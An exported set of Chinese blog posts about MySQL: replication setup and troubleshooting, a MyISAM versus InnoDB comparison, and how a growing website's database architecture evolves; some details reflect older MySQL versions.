&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q. Neither –relay-log nor –relay-log-index were used; so replication may break when this MySQL server acts as a slave and has his hostname changed!! Please use ‘–relay-log=mysql-relay-bin’ to avoid this problem. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A: 在my.cnf 的[mysqld]中加入 relay-log=mysql-relay-bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q. [ERROR] The slave I/O thread stops because master and slave have equal MySQL server ids; these ids must be different for replication to work (or the –replicate-same-server-id option must be used on slave but this does not always make sense; please check the manual before using it). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A: 在my.cnf 的[mysqld]中加入 replicate-same-server-id &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q.[Note] Slave I/O thread: connected to master ‘test@:3306′,replication started in log ‘FIRST’ at position 4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[ERROR] Error reading packet from server: Access denied; you need the REPLICATION SLAVE privilege for this operation ( server_errno=1227) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A: 可能原来使用过slave链接.需要将mysql库中的master.info删除重新 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q：如果主服务器正在运行并且不想停止主服务器，怎样配置一个从服务器？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A：有多种方法。如果你在某时间点做过主服务器备份并且记录了相应快照的二进制日志名和偏移量(通过SHOW MASTER STATUS命令的输出)，采用下面的步骤： 确保从服务器分配了一个唯一的服务器ID号。 在从服务器上执行下面的语句，为每个选项填入适当的值： 123456mysql&gt; CHANGE MASTER TO -&gt;MASTER_HOST='master_host_name', -&gt;MASTER_USER='master_user_name', -&gt;MASTER_PASSWORD='master_pass', -&gt;MASTER_LOG_FILE='recorded_log_file_name', -&gt;MASTER_LOG_POS=recorded_log_position; 在从服务器上执行START SLAVE语句。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你没有备份主服务器，这里是一个创建备份的快速程序。所有步骤都应该在主服务器主机上执行。 发出该语句： 1mysql&gt; FLUSH TABLES WITH READ LOCK； 仍然加锁时，执行该命令(或它的变体)： 1shell&gt; tar zcf /tmp/backup.tar.gz /var/lib/mysql 发出该语句并且确保记录了以后用到的输出： 1mysql&gt;SHOW MASTER STATUS； 释放锁： 1mysql&gt; UNLOCK TABLES； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个可选择的方法是，转储主服务器的SQL来代替前面步骤中的二进制复制。要这样做，你可以在主服务器上使用mysqldump –master-data，以后装载SQL转储到到你的从服务器。然而，这比进行二进制复制速度慢。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不管你使用这两种方法中的那一个，当你有一个快照和记录了日志名与偏移量时，后来根据说明操作。你可以使用相同的快照建立多个从服务器。一旦你拥有主服务器的一个快照，可以等待创建一个从服务器，只要主服务器的二进制日志完整。两个能够等待的时间实际的限制是指在主服务器上保存二进制日志的可用硬盘空间和从服务器同步所用的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你也可以使用LOAD DATA FROM MASTER。这是一个方便的语句，它传输一个快照到从服务器并且立即调整日志名和偏移量。将来，LOAD DATA FROM MASTER将成为创建从服务器的推荐方法。然而需要注意，它只工作在MyISAM 表上并且可能长时间持有读锁定。它并不象我们希望的那样高效率地执行。如果你有大表，执行FLUSH TABLES WITH READ LOCK语句后，这时首选方法仍然是在主服务器上制作二进制快照。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Q：从服务器需要始终连接到主服务器吗？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A：不，不需要。从服务器可以宕机或断开连接几个小时甚至几天，重新连接后获得更新信息。例如，你可以在通过拨号的链接上设置主服务器/从服务器关系，其中只是偶尔短时间内进行连接。这意味着，在任何给定时间，从服务器不能保证与主服务器同步除非你执行某些特殊的方法。将来，我们将使用选项来阻塞主服务器直到有一个从服务器同步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log-slave-updates #这个参数一定要加上，否则不会给更新的记录些到二进制文件里 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slave-skip-errors #是跳过错误，继续执行复制操作 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主服务器上的相关命令： 12345678show master statusshow slave hostsshow logsshow binlog eventspurge logs to 'log_name'purge logs before 'date'reset master(老版本flush master)set sql_log_bin= &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从服务器上的相关命令: 12345678910111213slave startslave stopSLAVE STOP IO_THREAD //此线程把master段的日志写到本地SLAVE start IO_THREADSLAVE STOP SQL_THREAD //此线程把写到本地的日志应用于数据库SLAVE start SQL_THREADreset slaveSET GLOBAL SQL_SLAVE_SKIP_COUNTERload data from mastershow slave status(SUPER,REPLICATION CLIENT)CHANGE MASTER TO MASTER_HOST=, MASTER_PORT=,MASTER_USER=, MASTER_PASSWORD= //动态改变master信息PURGE MASTER [before 'date'] 删除master端已同步过的日志6.3.1 Master 同步线程状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下列出了master的 Binlog Dump 线程 State 字段中最常见的几种状态。如果在master上没有 Binlog Dump 线程，那么同步就没有在运行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说，没有slave连接上来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Sending binlog event to slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事件是由二进制日志构成，一个事件通常由更新语句加上其他信息。线程读取到一个事件并正发送到slave上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Finished reading one binlog; switching to next binlog &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读取完了一个二进制日志，正切换到下一个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Has sent all binlog to slave; waiting for binlog to be updated &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已经读取完全部未完成更新日志，并且全部都发送到slave了。它处于空闲状态，正等待在master上执行新的更新操作以在二进制日志中产生新的事件，然后读取它们。 1Waiting to finalize termination &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当前线程停止了，这个时间很短。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6.3.2 Slave的I/O线程状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下列出了slave的I/O线程 State 字段中最常见的几种状态。从MySQL 4.1.1开始，这个状态在执行 SHOW SLAVE STATUS 语句结果的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave_IO_State 字段也会出现。这意味着可以只执行 SHOW SLAVE STATUS 语句就能了解到更多的信息。 Connecting to master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该线程证尝试连接到master上。 Checking master version 确定连接到master后出现的一个短暂的状态。 Registering slave on master 确定连接到master后出现的一个短暂的状态。 Requesting binlog dump 确定连接到master后出现的一个短暂的状态。该线程向master发送一个请求，告诉它要请求的二进制文件以及开始位置。 Waiting to reconnect after a failed binlog dump request &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果二进制日志转储(binary log dump)请求失败了(由于连接断开)，该线程在休眠时进入这个状态，并定期重连。重连的时间间隔由 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;–master-connect-retry 选项来指定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Reconnecting after a failed binlog dump request &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该线程正尝试重连到master。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting for master to send event &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已经连接到master，正等待它发送二进制日志。如果master闲置时，这个状态可能会持续较长时间，如果它等待超过 slave_read_timeout 秒，就会发生超时。这时，它就会考虑断开连接，然后尝试重连。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Queueing master event to the relay log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已经读取到一个事件，正把它拷贝到中继日志中以备SQL线程处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting to reconnect after a failed master event read &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读日志时发生错误(由于连接断开)。该线程在重连之前休眠 master-connect-retry 秒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Reconnecting after a failed master event read &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正尝试重连到master。当连接确定后，状态就变成 Waiting for master to send event。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting for the slave SQL thread to free enough relay log space &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;relay_log_space_limit 的值非零，中继日志的大小总和超过这个值了。I/O线程等待SQL线程先处理中继日志然后删除它们以释放足够的空间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting for slave mutex on exit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当前线程停止了，这个时间很短。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6.3.3 Slave的SQL线程状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下列出了slave的SQL线程 State 字段中最常见的几种状态： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Reading event from the relay log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从中继日志里读到一个事件以备执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Has read all relay log; waiting for the slave I/O thread to update it &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已经处理完中继日志中的全部事件了，正等待I/O线程写入更新的日志。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting for slave mutex on exit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当前线程停止了，这个时间很短。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常见的一些问题： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一.从库SLAVE启动问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于一些错误操作导致 CHANGE MASTER 和 SLAVE 服务无法启动，系统报错如下： 123*****************************************************************Could not initialize master info structure; more error messages can be found in the MySQL error log.***************************************************************** &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;无法初始化master info结构，MySQL错误日志记录了更详细的错误信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： 查看MySQL错误日志，如：同步的上一个Position是多少，很多情况下无法启动服务是由于mysql识别的同步始终停留在上一个Position上。 查看master.info和relay-log.info，master.info 记录MASTER相关信息，relay-log.info 记录当前同步日志信息。 停止myslq服务，删除master.info和relay-log.info。 启动mysql服务。 重新CHANGE MASTER，重新启动SLAVE服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;二.主从不能同步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;show slave status;报错:Error xxx dosn’t exist,且 123show slave status\G:Slave_SQL_Running: NOSeconds_Behind_Master: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法: 123stop slave;set global sql_slave_skip_counter =1 ;start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后Slave会和Master去同步 主要看: 12Slave_IO_Running: YesSlave_SQL_Running: Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Seconds_Behind_Master是否为0，0就是已经同步了 还需要做的一些优化与监视: 1234show full processlist; //查看mysql当前同步线程号skip-name-resolve //跳过dns名称查询，有助于加快连接及同步的速度max_connections=1000 //增大Mysql的连接数目，(默认100)max_connect_errors=100 //增大Mysql的错误连接数目,(默认10) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看日志一些命令 show master status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这里主要是看log-bin的文件是否相同。 1show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这里主要是看: 12Slave_IO_Running=YesSlave_SQL_Running=Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果都是Yes,则说明配置成功. 在master上输入show processlist\G; 1mysql&gt; SHOW PROCESSLIST\G &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出现Command: Binlog Dump,则说明配置成功. 12345678910111213141516171819202122stop slave #停止同步start slave #开始同步，从日志终止的位置开始更新。SET SQL_LOG_BIN=0|1 #主机端运行，需要super权限，用来开停日志，随意开停，会造成主机从机数据不一致，造成错误SET GLOBAL SQL_SLAVE_SKIP_COUNTER=n # 客户端运行，用来跳过几个事件，只有当同步进程出现错误而停止的时候才可以执行。RESET MASTER #主机端运行,清除所有的日志，这条命令就是原来的FLUSH MASTERRESET SLAVE #从机运行，清除日志同步位置标志，并重新生成master.info虽然重新生成了master.info,但是并不起用，最好，将从机的mysql进程重启一下，LOAD TABLE tblname FROM MASTER #从机运行，从主机端重读指定的表的数据，每次只能读取一个，受timeout时间限制，需要调整timeout时间。执行这个命令需要同步账号有 reload和super权限。以及对相应的库有select权限。如果表比较大，要增加net_read_timeout 和 net_write_timeout的值LOAD DATA FROM MASTER #从机执行，从主机端重新读入所有的数据。执行这个命令需要同步账号有reload和super权限。以及对相应的库有select权限。如果表比较大，要增加net_read_timeout 和 net_write_timeout的值CHANGE MASTER TO master_def_list #在线改变一些主机设置，多个用逗号间隔，比如：CHANGE MASTER TOMASTER_HOST='master2.mycompany.com',MASTER_USER='replication',MASTER_PASSWORD='bigs3cret'MASTER_POS_WAIT() #从机运行SHOW MASTER STATUS #主机运行，看日志导出信息SHOW SLAVE HOSTS #主机运行，看连入的从机的情况。SHOW SLAVE STATUS (slave)SHOW MASTER LOGS (master)SHOW BINLOG EVENTS [ IN 'logname' ] [ FROM pos ] [ LIMIT [offset,] rows ]PURGE [MASTER] LOGS TO 'logname' ; PURGE [MASTER] LOGS BEFORE 'date'show binlog events; #查看主库二进制日志文件内容： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意： 主辅库同步主要是通过二进制日志来实现同步的。 在启动辅库的时候必须先把数据同步，并删除日志目录下的：master.info文件。因为master.info记录了上次要连接主库的信息，如果不删除，即使my.cnf里进行了修改，也不起作用，因为读取的还是master.info文件里的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;补充：从服务器上my.cnf中的master-*的设置仅在第一次生效，后保存在master.info文件里。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从服务器上使用show slave status &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave_IO_Running,为No,则说明IO_THREAD没有启动，请执行slave start [IO_THREAD] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave_SQL_Running为No则复制出错,查看Last_error字段排除错误后执行slave start [SQL_THREAD] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看Slave_IO_State字段 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;空 //复制没有启动 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Connecting to master//没有连接上master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Waiting for master to send event//已经连上 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用LOAD DATA FROM MASTER语句来建立slave，但有约束条件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据表要全部是MyISAM表，必须有SUPER权限，master的复制用户必须具备RELOAD和SUPER权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在master端执行RESET MASTER清除已有的日志变更，此时slave端会因为找不到master日志无法启动IO_THREAD，请清空data目录下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;relay-log.info,hosname-relay-bin*等文件重新启动mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中继日志文件默认的文件为hostname-relay-bin.nnn和hostname-relay-bin.index。可用从服务器的– &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;relay-log和–relay-log-index选项修改。在从服务器中还有一个relay-log.info中继信息文件，可用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;–relay-log-info-file启动选项修改文件名。双机互备则是两个mysql同时配置为master及slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主服务器上的相关命令： 12345678show master statusshow slave hostsshow &#123;master|binary&#125; logsshow binlog eventspurge &#123;master|binary&#125; logs to 'log_name'purge &#123;master|binary&#125; logs before 'date'reset master(老版本flush master)set sql_log_bin=&#123;0|1&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从服务器上的相关命令: 123456789101112slave startslave stopSLAVE STOP IO_THREAD //此线程把master段的日志写到本地SLAVE start IO_THREADSLAVE STOP SQL_THREAD //此线程把写到本地的日志应用于数据库SLAVE start SQL_THREADreset slaveSET GLOBAL SQL_SLAVE_SKIP_COUNTERload data from mastershow slave status(SUPER,REPLICATION CLIENT)CHANGE MASTER TO MASTER_HOST=, MASTER_PORT=,MASTER_USER=, MASTER_PASSWORD= //动态改变master信息PURGE MASTER [before 'date'] 删除master端已同步过的日志 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql的Relay Log无法自动删除 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现其数据目录下的relay-log 长期没有删除，已经堆积了几十个relay-log。然而其他作为Slave服务器实例却没有这种情况，综合分析后发现和以下原因有关。 该实例原先是一个Slave ——-导致relay-log 和 relay-log.index的存在 该实例目前已经不是Slave ——-由于没有了IO-Thread，导致relay-log-purge 没有起作用( 这也是其他Slave实例没有这种情况的原因，因为IO-thread会做自动rotate操作)。 该实例每天会进行日常备份 ——-Flush logs的存在，导致每天会生成一个relay-log 该实例没有配置expire-logs-days ——导致flush logs时，也不会做relay-log清除 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简而言之就是： 一个实例如果之前是Slave，而之后停用了(stop slave)，且没有配置expire-logs-days的情况下，会出现relay-log堆积的情况。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顺带也和大家分享下MySQL内部Logrotate的机制 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Binary Log rotate机制： Rotate：每一条binary log写入完成后，都会判断当前文件是否超过 max_binlog_size，如果超过则自动生成一个binlog file。 Delete：expire-logs-days 只在 实例启动时 和 flush logs 时判断，如果文件访问时间早于设定值，则purge file。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Relay Log rotate 机制： Rotate：每从Master fetch一个events后，判断当前文件是否超过 max_relay_log_size 如果超过则自动生成一个新的relay-log-file。 Delete：purge-relay-log 在SQL Thread每执行完一个events时判断，如果该relay-log 已经不再需要则自动删除。 Delete：expire-logs-days 只在 实例启动时 和 flush logs 时判断，如果文件访问时间早于设定值，则purge file (同Binlog file) (注意: expire-logs-days和relaylog的purge没有关系)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此建议当slave不再使用时，通过reset slave来取消relaylog，以免出现relay-log堆积的情况。 s&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lave的主从信息变更引起的错误 12345678130311 14:15:46 mysqld started130311 14:15:46 [Warning] option 'read_rnd_buffer_size': unsigned value 0 adjusted to 8200130311 14:15:47 InnoDB: Started; log sequence number 15 2381115047130311 14:15:47 [ERROR] Failed to open the relay log './localhost-relay-bin.000037' (relay_log_pos 52474065)130311 14:15:47 [ERROR] Could not find target log during relay log initialization130311 14:15:47 [ERROR] Failed to initialize the master info structure130311 14:15:47 [Note] /usr/local/mysql/libexec/mysqld: ready for connections.Version: '5.0.87-log' socket: '/var/tmp/mysql2.sock' port: 3308 Source distribution &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于新的slave改变了服务端口和文件路径，分析应该是由于mysql-relay-bin.index中仍然保存着旧relay日志文件的路径，而这些路径下又找不到合适的文件，因此报错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于这类问题解决起来是比较简单的，重置slave的参照即可。 12345mysql&gt; reset slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; change master to ....ERROR 29 (HY000): File '/data/mysqldata/3306/binlog/mysql-relay-bin.000001' not found (Errcode: 2) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看来应该还是mysql-relay-bin.index的问题，删除该文件及关联的relay-bin文件。再次配置master： 12mysql&gt; change master to ....ERROR 1201 (HY000): Could not initialize master info structure; more error messages can be found in the MySQL error log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现了新的错误，按照提示查看error_log也没发现更多错误信息，error_log中只是显示一条： 1120326 11:14:27 [ERROR] Error reading master configuration &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在操作系统端查看master/slave的配置文件，发现是两个0字节文件： 12-rw-rw---- 1 mysql mysql 0 Mar 26 11:13 master.info-rw-rw---- 1 mysql mysql 0 Mar 26 11:13 relay-log.info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;会不会是这个原因呢，直接删除这两个文件，然后尝试重新执行change master： 12mysql&gt; change master to ....Query OK, 0 rows affected (0.00 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;成功，启动slave并查看状态： 1234mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;故障解决。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘故障 1Warning: a page in the doublewrite buffer is not within space &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现此种报错，多为磁盘故障。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master不能初始化 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ERROR 1201 (HY000): Could not initialize master解决方法 1234567mysql&gt; change master to master_host='192.168.1.10',master_user='replication',master_password='123456',master_log_file='freeoa_log.000003',master_log_pos=106;ERROR 1201 (HY000): Could not initialize master info structure; more error messages can be found in the MySQL error logmysql&gt; slave stop;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; reset slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现这个问题的原因，应该是以前mysql做过主从。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL存储引擎MyISAM与InnoDB的优劣]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F15.%20MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8EMyISAM%E4%B8%8EInnoDB%E7%9A%84%E4%BC%98%E5%8A%A3%2F</url>
    <content type="text"><![CDATA[MySQL存储引擎MyISAM与InnoDB的优劣&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用MySQL当然会接触到MySQL的存储引擎，在新建数据库和新建数据表的时候都会看到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL默认的存储引擎是MyISAM，其他常用的就是InnoDB了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至于到底用哪种存储引擎比较好？这个问题是没有定论的，需要根据你的需求和环境来衡量。所以对这两种引擎的概念、原理、异同和各自的优劣点有了详细的了解之后，再根据自己的情况选择起来就容易多了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; MyISAM InnoDB 存储结构 每张表被存放在三个文件： frm-表格定义 MYD(MYData)-数据文件 MYI(MYIndex)-索引文件 所有的表都保存在同一个数据文件中（也可能是多个文件，或者是独立的表空间文件），InnoDB表的大小只受限于操作系统文件的大小，一般为2GB 存储空间 MyISAM可被压缩，存储空间较小 InnoDB的表需要更多的内存和存储，它会在主内存中建立其专用的缓冲池用于高速缓冲数据和索引 可移植性、备份及恢复 由于MyISAM的数据是以文件的形式存储，所以在跨平台的数据转移中会很方便。在备份和恢复时可单独针对某个表进行操作 免费的方案可以是拷贝数据文件、备份 binlog，或者用 mysqldump，在数据量达到几十G的时候就相对痛苦了事务安全不支持 每次查询具有原子性支持 具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表 AUTO_INCREMENT MyISAM表可以和其他字段一起建立联合索引 InnoDB中必须包含只有该字段的索引 SELECT MyISAM更优 &#160;&#160;&#160;&#160; INSERT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; InnoDB更优 UPDATE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; InnoDB更优 DELETE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; InnoDB更优 它不会重新建立表，而是一行一行的删除 COUNT without WHERE MyISAM更优。因为MyISAM保存了表的具体行数 InnoDB没有保存表的具体行数，需要逐行扫描统计，就很慢了 COUNT with WHERE 一样 一样，InnoDB也会锁表 锁 只支持表锁 支持表锁、行锁 行锁大幅度提高了多用户并发操作的新能。但是InnoDB的行锁，只是在WHERE的主键是有效的，非主键的WHERE都会锁全表的 外键 不支持 支持 FULLTEXT全文索引 支持 不支持 可以通过使用Sphinx从InnoDB中获得全文索引，会慢一点 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总的来说，MyISAM和InnoDB各有优劣，各有各的使用环境。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是InnoDB的设计目标是处理大容量数据库系统，它的CPU利用率是其它基于磁盘的关系数据库引擎所不能比的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我觉得使用InnoDB可以应对更为复杂的情况，特别是对并发的处理要比MyISAM高效。同时结合memcache也可以缓存SELECT来减少SELECT查询，从而提高整体性能。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql架构由小变大的演变过程]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F30.%20mysql%E6%9E%B6%E6%9E%84%E7%94%B1%E5%B0%8F%E5%8F%98%E5%A4%A7%E7%9A%84%E6%BC%94%E5%8F%98%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[mysql架构由小变大的演变过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设一个网站（discuz）从最开始访问量很小做到日pv千万，我们来推测一下它的mysql服务器架构演变过程。 第一阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站访问量日pv量级在1w以下。单台机器跑web和db，不需要做架构层调优（比如，不需要增加memcached缓存）。此时，数据往往都是每日冷备份的，但有时候如果考虑数据安全性，会搭建一个mysql主从。 第二阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站访问量日pv达到几万。此时单台机器已经有点负载，需要我们把web和db分开，需要搭建memcached服务作为缓存。也就是说，在这个阶段，我们还可以使用单台机器跑mysql去承担整个网站的数据存储和查询。如果做mysql主从，目的也是为了数据安全性。 第三阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站访问量日pv达到几十万。单台机器虽然也可以支撑，但是需要的机器配置要比之前的机器好很多。如果经费允许，可以购买配置很高的机器来跑mysql服务，但是并不是说，配置翻倍，性能也翻倍，到了一定阶段配置增加已经不能带来性能的增加。所以，此阶段，我们会想到做mysql服务的集群，也就是说我们可以拿多台机器跑mysql。但，mysql的集群和web集群是不一样的，我们需要考虑数据的一致性，所以不能简单套用做web集群的方式（lvs，nginx代理）。可以做的架构是，mysql主从，一主多从。为了保证架构的健壮和数据完整，主只能是一个，从可以是多个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一个问题，我们需要想到，就是在前端web层，我们的程序里面指定了mysql机器的ip，那么当mysql机器有多台时，程序里面如何去配置？discuz，其实有一个功能，支持mysql读写分离。即，我们可以拿多台机器跑mysql，其中一台写，其他多台是读，我们只需要把读和写的ip分别配置到程序中，程序自动会去区分机器。当然，如果不使用discuz自带的配置，我们还可以引用一个软件叫做 mysql-proxy, 使用他来实现读写分离。它支持一主多从的模式。 第四阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站访问量日pv到几百万。之前的一主多从模式已经遇到瓶颈，因为当网站访问量变大，读数据库的量也会越来越大，我们需要多加一些从进来，但是从的数量增加到数十台时，由于主需要把bin-log全部分发到所有从上，那么这个过程本身就是一件很繁琐的事情，再加上频繁读取，势必会造成从上同步过来的数据有很大延迟。所以，我们可以做一个优化， 把mysql原来的一主多从变为一主一从，然后从作为其他从的主，而前面的主只负责网站业务的写入，而后面的从不负责网站任何业务，只负责给其他从同步bin-log。这样还可以继续多叠加几个从库。 第五阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站访问量日pv到1千万的时候，我们发现，网站的写入量非常大，我们之前架构中只有一个主，这里的主已经成为瓶颈了。所以，需要再近一步做出调整。比如，我们可以把业务分模块，把用户相关的单独分离出来，把权限、积分等也可以分离出来单独跑一个库，然后再做主从，也就是所谓的分库。当然也可以换一个纬度，把访问量或者写入量大的表单独分离出来，跑在一台服务器上，也可以把一个表分成多个小表。这一步操作，涉及到一些程序上的改动，所以需要事先和开发同事做好沟通和设计。总之，这一步要做的就是分库分表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再往后发展，继续把大表分小表即可。 而国内阿里淘宝网站的数据量是巨量的，他们的数据库全部都是mysql，他们的mysql架构就是遵循分库分表这个原则的，只不过他们划分规则会有很多纬度，比如可以根据地域划分，可以根据买家、卖家划分，可以根据时间划分等等。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql binlog 日志的三种模式]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F16.%20Mysql%20binlog%20%E6%97%A5%E5%BF%97%E7%9A%84%E4%B8%89%E7%A7%8D%E6%A8%A1%E5%BC%8F%2F</url>
